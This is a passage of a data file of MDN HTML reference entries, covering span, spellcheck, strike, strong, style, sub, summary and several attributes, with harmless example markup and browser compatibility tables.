}\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Example\n\n### Example 1\n\n#### HTML\n\nhtml\n\n```\n<p><span>Some text</span></p>\n```\n\n#### Result\n\n### Example 2\n\n#### HTML\n\nhtml\n\n```\n<li>\n  <span>\n    <a href=\"portfolio.html\" target=\"_blank\">See my portfolio</a>\n  </span>\n</li>\n```\n\n#### CSS\n\ncss\n\n```\nli span {\n  background: gold;\n}\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                      |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content).                                                      |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                          |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content), or any element that accepts [flow content](../content_categories#flow_content). |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                  |\n| Permitted ARIA roles                        | Any                                                                                                                                                                  |\n| DOM interface                               | [`HTMLSpanElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSpanElement)                                                                                |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `span` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- HTML [`<div>`](div) element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/span](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/span)"
- name: span (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`span`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/span)

    [`<col>`](element/col), [`<colgroup>`](element/colgroup)
- name: spellcheck (attribute)
  summary: The spellcheck global attribute is an enumerated attribute that defines whether the element may be checked for spelling errors
  description: "# spellcheck\n\nThe `spellcheck` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute that defines whether the element may be checked for spelling errors.\n\n**Note:** This attribute is merely a hint for the browser: browsers are not required to check for spelling errors. Typically non-editable elements are not checked for spelling errors, even if the `spellcheck` attribute is set to `true` and the browser supports spellchecking.\n\n## Try it\n\n#### HTML Demo: spellcheck\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <textarea spellcheck=\"true\">This exampull will be checkd fur spellung when you try to edit it.</textarea>\n\n    <textarea spellcheck=\"false\">This exampull will nut be checkd fur spellung when you try to edit it.</textarea>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIt may have the following values:\n\n- empty string or `true`, which indicates that the element should be, if possible, checked for spelling errors;\n- `false`, which indicates that the element should not be checked for spelling errors.\n\nIf this attribute is not set, its default value is element-type and browser-defined. This default value may also be *inherited*, which means that the element content will be checked for spelling errors only if its nearest ancestor has a *spellcheck* state of `true`.\n\n## Security and privacy concerns\n\nUsing spellchecking can have consequences for users' security and privacy. The specification does not regulate *how* spellchecking is done and the content of the element may be sent to a third party for spellchecking results (see [enhanced spellchecking and \"spell-jacking\"](https://www.comparitech.com/blog/information-security/what-is-spell-jacking/)).\n\nYou should consider setting `spellcheck` to `false` for elements that can contain sensitive information.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|              | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|              | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `spellcheck` | 9       | 12   | 2       | 15    | 5.1    | 47             | 57                  | 37            | 9.3           | 5.0              | 47              |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/spellcheck](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/spellcheck)"
- name: src (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`src`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/src)

    [`<audio>`](element/audio), [`<embed>`](element/embed), [`<iframe>`](element/iframe), [`<img>`](element/img), [`<input>`](element/input), [`<script>`](element/script), [`<source>`](element/source), [`<track>`](element/track), [`<video>`](element/video)

    The URL of the embeddable content.
- name: srcdoc (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`srcdoc`](element/iframe#srcdoc)

    [`<iframe>`](element/iframe)
- name: srclang (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`srclang`](element/track#srclang)

    [`<track>`](element/track)
- name: srcset (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`srcset`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/srcset)

    [`<img>`](element/img), [`<source>`](element/source)

    One or more responsive image candidates.
- name: start (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`start`](element/ol#start)

    [`<ol>`](element/ol)

    Defines the first number if other than 1.
- name: step (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`step`](attributes/step)

    [`<input>`](element/input)
- name: strike
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<strike\\>\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<strike>` [HTML](../index) element places a strikethrough (horizontal line) over text.\n\n**Warning:** This element is deprecated in HTML 4 and XHTML 1, and obsoleted in the [HTML Living Standard](https://html.spec.whatwg.org/multipage/obsolete.html#strike). If semantically appropriate, i.e., if it represents *deleted* content, use [`<del>`](del) instead. In all other cases use [`<s>`](s).\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n## Examples\n\nhtml\n\n```\n&lt;strike&gt;: <strike>Today's Special: Salmon</strike> SOLD OUT<br />\n&lt;s&gt;: <s>Today's Special: Salmon</s> SOLD OUT\n```\n\n### Result\n\n## Technical summary\n\n|               |                                                                               |\n|---------------|-------------------------------------------------------------------------------|\n| DOM interface | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<s>`](s) element.\n- The [`<del>`](del) element should be used if the data has been *deleted*.\n- The CSS [`text-decoration`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration) property can be used to style text with a strikethrough.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/strike](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/strike)"
- name: strong
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<strong\\>: The Strong Importance element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fstrong&level=high)\n\nThe `<strong>` [HTML](../index) element indicates that its contents have strong importance, seriousness, or urgency. Browsers typically render the contents in bold type.\n\n## Try it\n\n#### HTML Demo: \\<strong\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      ... the most important rule, the rule you can never forget, no matter how much he cries, no matter how much he begs:\n      <strong>never feed him after midnight</strong>.\n    </p>\n\n    p {\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<strong>` element is for content that is of \"strong importance,\" including things of great seriousness or urgency (such as warnings). This could be a sentence that is of great importance to the whole page, or you could merely try to point out that some words are of greater importance compared to nearby content.\n\nTypically this element is rendered by default using a bold font weight. However, it should *not* be used to apply bold styling; use the CSS [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) property for that purpose. Use the [`<b>`](b) element to draw attention to certain text without indicating a higher level of importance. Use the [`<em>`](em) element to mark text that has stress emphasis.\n\nAnother accepted use for `<strong>` is to denote the labels of paragraphs which represent notes or warnings within the text of a page.\n\n### \\<b\\> vs. \\<strong\\>\n\nIt is often confusing to new developers why there are so many ways to express the same thing on a rendered website. [`<b>`](b) and `<strong>` are perhaps one of the most common sources of confusion, causing developers to ask \"Should I use `<b>` or `<strong>`? Don't they both do the same thing?\"\n\nNot exactly. The `<strong>` element is for content that is of greater importance, while the `<b>` element is used to draw attention to text without indicating that it's more important.\n\nIt may help to realize that both are valid and semantic elements in HTML and that it's a coincidence that they both have the same default styling (boldface) in most browsers (although some older browsers actually underline `<strong>`). Each element is meant to be used in certain types of scenarios, and if you want to bold text for decoration, you should instead actually use the CSS [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) property.\n\nThe intended meaning or purpose of the enclosed text should be what determines which element you use. Communicating meaning is what semantics are all about.\n\n### \\<em\\> vs. \\<strong\\>\n\nAdding to the confusion is the fact that while HTML 4 defined `<strong>` as indicating a stronger emphasis, HTML 5 defines `<strong>` as representing \"strong importance for its contents.\" This is an important distinction to make.\n\nWhile `<em>` is used to change the meaning of a sentence as spoken emphasis does (\"I *love* carrots\" vs. \"I love *carrots*\"), `<strong>` is used to give portions of a sentence added importance (e.g., \"**Warning!** This is **very dangerous.**\") Both `<strong>` and `<em>` can be nested to increase the relative degree of importance or stress emphasis, respectively.\n\n## Examples\n\n### Basic example\n\nhtml\n\n```\n<p>\n  Before proceeding, <strong>make sure you put on your safety goggles</strong>.\n</p>\n```\n\n#### Result\n\n### Labeling warnings\n\nhtml\n\n```\n<p>\n  <strong>Important:</strong> Before proceeding, make sure you add plenty of\n  butter.\n</p>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                      |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.                                    |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                          |\n| Tag omission                                | None; must have both a start tag and an end tag.                                                                                                                     |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content), or any element that accepts [flow content](../content_categories#flow_content). |\n| Implicit ARIA role                          | [`strong`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents)                            |\n| Permitted ARIA roles                        | Any                                                                                                                                                                  |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                        |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<b>`](b) element\n- The [`<em>`](em) element\n- The [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) property\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/strong](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/strong)"
- name: style
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<style\\>: The Style Information element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fstyle&level=high)\n\nThe `<style>` [HTML](../index) element contains style information for a document, or part of a document. It contains CSS, which is applied to the contents of the document containing the `<style>` element.\n\n## Try it\n\n#### HTML Demo: \\<style\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <style>\n      p {\n        color: #26b72b;\n      }\n      code {\n        font-weight: bold;\n      }\n    </style>\n\n    <p>This text will be green. Inline styles take precedence over CSS included externally.</p>\n\n    <p style=\"color: blue\">The <code>style</code> attribute can override it, though.</p>\n\n    p {\n      color: #f00;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe `<style>` element must be included inside the [`<head>`](head) of the document. In general, it is better to put your styles in external stylesheets and apply them using [`<link>`](link) elements.\n\nIf you include multiple `<style>` and `<link>` elements in your document, they will be applied to the DOM in the order they are included in the document — make sure you include them in the correct order, to avoid unexpected cascade issues.\n\nIn the same manner as `<link>` elements, `<style>` elements can include `media` attributes that contain [media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries), allowing you to selectively apply internal stylesheets to your document depending on media features such as viewport width.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`blocking`](#blocking) Experimental  \nThis attribute explicitly indicates that certain operations should be blocked on the fetching of critical subresources. [`@import`](https://developer.mozilla.org/en-US/docs/Web/CSS/@import)-ed stylesheets are generally considered as critical subresources, whereas [`background-image`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-image) and fonts are not. The operations that are to be blocked must be a space-separated list of blocking tokens listed below.\n\n- `render`: The rendering of content on the screen is blocked.\n\n[`media`](#media)  \nThis attribute defines which media the style should be applied to. Its value is a [media query](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries), which defaults to `all` if the attribute is missing.\n\n[`nonce`](#nonce)  \nA cryptographic nonce (number used once) used to allow inline styles in a [style-src Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src). The server must generate a unique nonce value each time it transmits a policy. It is critical to provide a nonce that cannot be guessed as bypassing a resource's policy is otherwise trivial.\n\n[`title`](#title)  \nThis attribute specifies [alternative style sheet](https://developer.mozilla.org/en-US/docs/Web/CSS/Alternative_style_sheets) sets.\n\n### Deprecated attributes\n\n[`type`](#type) Deprecated  \nThis attribute should not be provided: if it is, the only permitted values are the empty string or a case-insensitive match for `text/css`.\n\n## Examples\n\n### A simple stylesheet\n\nIn the following example, we apply a very simple stylesheet to a document:\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>Test page</title>\n    <style>\n      p {\n        color: red;\n      }\n    </style>\n  </head>\n  <body>\n    <p>This is my paragraph.</p>\n  </body>\n</html>\n```\n\n#### Result\n\n### Multiple style elements\n\nIn this example we've included two `<style>` elements — notice how the conflicting declarations in the later `<style>` element override those in the earlier one, if they have equal [specificity](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity).\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>Test page</title>\n    <style>\n      p {\n        color: white;\n        background-color: blue;\n        padding: 5px;\n        border: 1px solid black;\n      }\n    </style>\n    <style>\n      p {\n        color: blue;\n        background-color: yellow;\n      }\n    </style>\n  </head>\n  <body>\n    <p>This is my paragraph.</p>\n  </body>\n</html>\n```\n\n#### Result\n\n### Including a media query\n\nIn this example we build on the previous one, including a `media` attribute on the second `<style>` element so it is only applied when the viewport is less than 500px in width.\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>Test page</title>\n    <style>\n      p {\n        color: white;\n        background-color: blue;\n        padding: 5px;\n        border: 1px solid black;\n      }\n    </style>\n    <style media=\"all and (max-width: 500px)\">\n      p {\n        color: blue;\n        background-color: yellow;\n      }\n    </style>\n  </head>\n  <body>\n    <p>This is my paragraph.</p>\n  </body>\n</html>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                         |\n|---------------------------------------------|-----------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Metadata content](../content_categories#metadata_content).                             |\n| Permitted content                           | Text content matching the `type` attribute, that is `text/css`.                         |\n| Tag omission                                | Neither tag is omissible.                                                               |\n| Permitted parents                           | Any element that accepts [metadata content](../content_categories#metadata_content).    |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)     |\n| Permitted ARIA roles                        | No `role` permitted                                                                     |\n| DOM interface                               | [`HTMLStyleElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLStyleElement) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<link>`](link) element, which allows us to apply external stylesheets to a document.\n- [Alternative Style Sheets](https://developer.mozilla.org/en-US/docs/Web/CSS/Alternative_style_sheets)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/style](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/style)"
- name: style (attribute)
  summary: The style global attribute contains CSS styling declarations to be applied to the element
  description: "# style\n\nThe `style` [global attribute](../global_attributes) contains [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) styling declarations to be applied to the element. Note that it is recommended for styles to be defined in a separate file or files. This attribute and the [`<style>`](../element/style) element have mainly the purpose of allowing for quick styling, for example for testing purposes.\n\n## Try it\n\n#### HTML Demo: style\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div style=\"background: #ffe7e8; border: 2px solid #e66465\">\n      <p style=\"margin: 15px; line-height: 1.5; text-align: center\">\n        Well, I am the slime from your video<br />\n        Oozin' along on your livin' room floor.\n      </p>\n    </div>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** This attribute must not be used to convey semantic information. Even if all styling is removed, a page should remain semantically correct. Typically it shouldn't be used to hide irrelevant information; this should be done using the [`hidden`](hidden) attribute.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `style` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Global attributes](../global_attributes)\n- [`HTMLElement.style`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/style)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style)"
- name: sub
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<sub\\>: The Subscript element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsub&level=high)\n\nThe `<sub>` [HTML](../index) element specifies inline text which should be displayed as subscript for solely typographical reasons. Subscripts are typically rendered with a lowered baseline using smaller text.\n\n## Try it\n\n#### HTML Demo: \\<sub\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      Almost every developer's favorite molecule is C<sub>8</sub>H<sub>10</sub>N<sub>4</sub>O<sub>2</sub>, also known as\n      \"caffeine.\"\n    </p>\n\n    p {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<sub>` element should be used only for typographical reasons—that is, to change the position of the text to comply with typographical conventions or standards, rather than solely for presentation or appearance purposes.\n\nFor example, using `<sub>` to style the name of a company which uses altered baselines in their [wordmark](https://en.wikipedia.org/wiki/Wordmark) would not be appropriate; instead, CSS should be used. For example, you could use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) property with a declaration like `vertical-align: sub` or, to more precisely control the baseline shift, `vertical-align: -25%`.\n\nAppropriate use cases for `<sub>` include (but aren't necessarily limited to):\n\n- Marking up footnote numbers. See [Footnote numbers](#footnote_numbers) for an example.\n- Marking up the subscript in mathematical variable numbers (although you may also consider using a [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML) formula for this). See [Variable subscripts](#variable_subscripts).\n- Denoting the number of atoms of a given element within a chemical formula (such as every developer's best friend, C ₈ H ₁₀ N ₄ O ₂ , otherwise known as \"caffeine\"). See [Chemical formulas](#chemical_formulas).\n\n## Examples\n\n### Footnote numbers\n\nTraditional footnotes are denoted using numbers which are rendered in subscript. This is a common use case for `<sub>`:\n\nhtml\n\n```\n<p>\n  According to the computations by Nakamura, Johnson, and Mason<sub>1</sub> this\n  will result in the complete annihilation of both particles.\n</p>\n```\n\n#### Result\n\n### Variable subscripts\n\nIn mathematics, families of variables related to the same concept (such as distances along the same axis) are represented using the same variable name with a subscript following. For example:\n\nhtml\n\n```\n<p>\n  The horizontal coordinates' positions along the X-axis are represented as\n  <var>x<sub>1</sub></var> … <var>x<sub>n</sub></var>.\n</p>\n```\n\n#### Result\n\n### Chemical formulas\n\nWhen writing a chemical formula, such as H₂0, the number of atoms of a given element within the described molecule is represented using a subscripted number; in the case of water, the subscripted \"2\" indicates that there are two atoms of hydrogen in the molecule.\n\nAnother example:\n\nhtml\n\n```\n<p>\n  Almost every developer's favorite molecule is\n  C<sub>8</sub>H<sub>10</sub>N<sub>4</sub>O<sub>2</sub>, which is commonly known\n  as \"caffeine.\"\n</p>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                              |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.            |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                  |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                        |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                         |\n| Implicit ARIA role                          | [`subscript`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                          |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `sub` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<sup>`](sup) HTML element that produces superscript. Note that you cannot use `sup` and `sub` both at the same time: you need to use [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML) to produce both a superscript directly above a subscript next to the chemical symbol of an element, representing its atomic number and its nuclear number.\n- The [`<msub>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/msub), [`<msup>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/msup), and [`<msubsup>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/msubsup) MathML elements.\n- The CSS [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) property.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/sub](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/sub)"
- name: summary
  summary: The <summary> HTML element specifies a summary, caption, or legend for a <details> element's disclosure box
  description: "# \\<summary\\>: The Disclosure Summary element\n\nThe `<summary>` [HTML](../index) element specifies a summary, caption, or legend for a [`<details>`](details) element's disclosure box. Clicking the `<summary>` element toggles the state of the parent `<details>` element open and closed.\n\n## Try it\n\n#### HTML Demo: \\<summary\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <details>\n      <summary>I have keys but no doors. I have space but no room. You can enter but can’t leave. What am I?</summary>\n      A keyboard.\n    </details>\n\n    details {\n      border: 1px solid #aaa;\n      border-radius: 4px;\n      padding: 0.5em 0.5em 0;\n    }\n\n    summary {\n      font-weight: bold;\n      margin: -0.5em -0.5em 0;\n      padding: 0.5em;\n    }\n\n    details[open] {\n      padding: 0.5em;\n    }\n\n    details[open] summary {\n      border-bottom: 1px solid #aaa;\n      margin-bottom: 0.5em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<summary>` element's contents can be any heading content, plain text, or HTML that can be used within a paragraph.\n\nA `<summary>` element may *only* be used as the first child of a `<details>` element. When the user clicks on the summary, the parent `<details>` element is toggled open or closed, and then a [`toggle`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDetailsElement/toggle_event) event is sent to the `<details>` element, which can be used to let you know when this state change occurs.\n\nThe content of the `<details>` provides the [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description) for the `<summary>`.\n\n### Default label text\n\nIf a `<details>` element's first child is not a `<summary>` element, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) will use a default string (typically \"Details\") as the label for the disclosure box.\n\n### Default style\n\nPer the HTML specification, the default style for `<summary>` elements includes `display: list-item`. This makes it possible to change or remove the icon displayed as the disclosure widget next to the label from the default, which is typically a triangle.\n\nYou can also change the style to `display: block` to remove the disclosure triangle.\n\nSee the [Browser compatibility](#browser_compatibility) section for details, as not all browsers support full functionality of this element yet.\n\nFor Webkit-based browsers, such as Safari, it is possible to control the icon display through the non-standard CSS pseudo-element `::-webkit-details-marker`. To remove the disclosure triangle, use `summary::-webkit-details-marker { display: none }`.\n\n## Examples\n\nBelow are some examples showing `<summary>` in use. You can find more examples in the documentation for the [`<details>`](details) element.\n\n### Basic example\n\nA simple example showing the use of `<summary>` in a [`<details>`](details) element:\n\nhtml\n\n```\n<details open>\n  <summary>Overview</summary>\n  <ol>\n    <li>Cash on hand: $500.00</li>\n    <li>Current invoice: $75.30</li>\n    <li>Due date: 5/6/19</li>\n  </ol>\n</details>\n```\n\n#### Result\n\n### Summaries as headings\n\nYou can use heading elements in `<summary>`, like this:\n\nhtml\n\n```\n<details open>\n  <summary><h4>Overview</h4></summary>\n  <ol>\n    <li>Cash on hand: $500.00</li>\n    <li>Current invoice: $75.30</li>\n    <li>Due date: 5/6/19</li>\n  </ol>\n</details>\n```\n\n#### Result\n\nThis currently has some spacing issues that could be addressed using CSS.\n\n**Warning:** Because the `<summary>` element has a default role of [button](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role) (which strips all roles from child elements), this example will not work for users of assistive technologies such as screen readers. The `<h4>` will have its role removed and thus will not be treated as a heading for these users.\n\n### HTML in summaries\n\nThis example adds some semantics to the `<summary>` element to indicate the label as important:\n\nhtml\n\n```\n<details open>\n  <summary><strong>Overview</strong></summary>\n  <ol>\n    <li>Cash on hand: $500.00</li>\n    <li>Current invoice: $75.30</li>\n    <li>Due date: 5/6/19</li>\n  </ol>\n</details>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                       |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | none                                                                                                                                  |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content) or one element of [Heading content](../content_categories#heading_content) |\n| Tag omission                                | None; both the start tag 